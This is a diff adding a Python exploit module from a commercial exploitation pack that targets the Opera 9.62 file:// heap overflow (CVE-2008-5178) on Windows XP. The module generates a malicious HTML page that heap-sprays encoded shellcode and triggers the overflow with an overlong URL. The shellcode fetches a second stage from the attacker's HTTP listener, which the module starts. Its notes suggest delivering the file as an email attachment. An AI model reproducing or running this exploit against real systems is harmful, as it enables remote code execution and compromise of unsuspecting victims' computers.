@@ -1,0 +1,197 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Opera Web Browser file:// Heap Overflow"
+
+DESCRIPTION = "Heap Overflow Vulnerability in Opera Web Browser"
+DOCUMENTATION = {}
+DOCUMENTATION['Date public'] = "2008.11.17"
+DOCUMENTATION['References'] = "http://www.securityfocus.com/bid/32323"
+DOCUMENTATION['VersionsAffected'] = "Opera Web Browser 9.62"
+DOCUMENTATION["CVE Name"] = "CVE-2008-5178"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5178"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+This vulnerability cannot be exploited from network. So the generated HTML file must be sent
+by mail as an attachment for example.
+
+Usage:
+.\commandlineInterface.py -p 80 -v 12 -l 192.168.1.1 -p 80
+.\3rdparty\D2SEC\exploits\d2sec_operaheap\d2sec_opera1.py -l 192.168.1.1 -d 80 -O HTTPMOSDEF:1 -O dsthtml:D:\opera.html
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows XP with Opera 9.62'],
+}
+
+class theexploit(tcpexploit,httpclientside):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		httpclientside.__init__(self)
+		self.badstring = "\x00"
+		self.subesp = 0
+		self.port = 80
+		self.bindip = "127.0.0.1"
+		self.name = NAME 
+		self.dsthtml = "opera.html"		
+		self.HTTPMOSDEF = 1
+		self.useSSL = 0
+		self.gui_update = True
+		
+		return
+
+
+	def gui_hook_function(self):
+		localip = "127.0.0.1"
+		
+		node = self.engine.passednodes[0]
+		node.getallips()		
+		itflist = node.interfaces.all_interfaces()
+		
+		for i in itflist:
+			tmpifc = node.interfaces.get_interface(i)
+			if tmpifc.activated:
+				localip = tmpifc.ip
+
+		filepath = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_opera1/" + self.dsthtml
+		
+		info = [("htmlfile", filepath), ("localip", localip)]
+
+		return info
+
+				        
+	def makefile(self):		
+		filedata = """
+<HTML> 
+<BODY>
+ 
+<SCRIPT language="javascript">  
+	  var stackBuffer = "";
+		var memory = new Array();
+		var heapBlocks = unescape("%u0606%u0606"); 
+		var payLoadCode = unescape('SHELLCODE'); 
+		
+		while (heapBlocks.length < 81920) {
+			heapBlocks += heapBlocks;
+			}
+					
+		for (i = 0 ; i < 1000 ; i++) {
+			memory[i] += (heapBlocks + payLoadCode);
+		}		
+
+    for(i = 0 ; i < 16438 ; i++) {
+    	stackBuffer += "A";
+    }		
+
+		window.location.replace("file://" + stackBuffer + "R.");
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+		filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))        
+		
+		return filedata
+    
+	
+	def createShellcode(self):		
+		host = self.bindip
+		port = self.port
+
+		httpWrapper = ''
+		
+		try:
+			if self.HTTPMOSDEF:				
+				sc = shellcodeGenerator.win32()
+				sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+					
+				if self.useSSL:
+					ssl = "s"
+				else:
+					ssl = ""                
+				    
+				sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+				httpWrapper = sc.get()                				
+		except:
+			httpWrapper = ""
+		    
+		rawshellcode = self.createInjectToSelf(host, port, injectme = httpWrapper, movetostack = True)
+		
+		from encoder import addencoder
+		encoder = chunkedaddencoder.intelchunkedaddencoder()
+		encoder.setbadstring(self.badstring)
+		
+		self.shellcode = encoder.encode(rawshellcode)
+		
+		return self.shellcode
+	
+		
+	def getArgs(self):
+		self.dsthtml = self.argsDict.get("htmlfile", self.dsthtml)							
+		self.port = int(self.argsDict.get("localport", self.port))
+		self.bindip = self.argsDict.get("localip", self.bindip)
+
+		return
+
+
+	def run(self):				
+		self.getArgs()		
+		self.createShellcode()
+		
+		node = self.argsDict["passednodes"][0]
+		node.getallips()
+		interface = node.interfaces.get_ip(self.bindip)
+
+		self.callback = self.engine.start_listener(interface, canvasengine.HTTPMOSDEF, self.port)
+			
+		htmlfile = self.makefile()
+		
+		f = open(self.dsthtml, "w")
+		f.write(htmlfile)
+		f.close()
+		
+		return 1
+
+
+	def usage(self):
+		print 'Usage: %s -O localip:<localhost> -O localport:<localport> -O htmlfile:dest_html_path'%(sys.argv[0])
+		sys.exit(0)
+
+
+
+if __name__=='__main__':
+    app = theexploit()
+    ret = standard_callback_commandline(app)
